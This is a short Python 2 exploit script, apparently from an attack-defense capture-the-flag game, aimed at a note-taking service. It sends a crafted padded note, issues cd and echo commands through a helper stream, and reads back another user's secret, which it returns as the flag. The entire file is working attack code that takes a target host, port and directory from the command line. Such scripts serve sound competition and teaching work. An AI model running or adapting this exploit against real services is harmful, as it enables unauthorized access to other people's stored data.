from interact import *
import sys

def retrieve_note_exploit(c, directory):
	send_note(c, "a" * 32 + "5" + "a" * 86)
	ss = SendStream(c)
	ss.cd(directory)
	ss.echo("a" * 15)
	ss.expect()
	return c.recvline().strip()

def exploit(host, port, directory):
	retrieve_flag = lambda c: retrieve_note_exploit(c, directory)
	flag = with_conn(host, port, retrieve_flag)
	return {"FLAG": flag}

if __name__ == "__main__":
	print exploit(sys.argv[1], int(sys.argv[2]), sys.argv[3])
